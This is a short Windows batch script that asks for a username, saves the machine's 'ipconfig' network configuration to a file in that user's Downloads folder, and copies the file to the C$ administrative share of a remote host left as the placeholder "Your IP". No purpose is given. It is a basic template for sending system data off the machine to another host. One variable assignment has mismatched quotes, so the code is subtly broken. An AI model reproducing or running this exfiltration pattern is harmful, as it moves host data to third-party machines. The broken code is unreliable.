@echo off

set /p FileLocation=Enter your Username or Account name:


set "outputFile=C:\Users\%FileLocation%\Downloads\output.txt"
ipconfig > "%outputFile%"



echo COPIED DATA

set "sourceFile=C:\Users\%FileLocation%\Downloads\output.txt"
set "destinationIP="Your IP"
set "destinationFolder=C$\Users\USERNAME\Desktop"

copy "%sourceFile%" "\\%destinationIP%\%destinationFolder%"
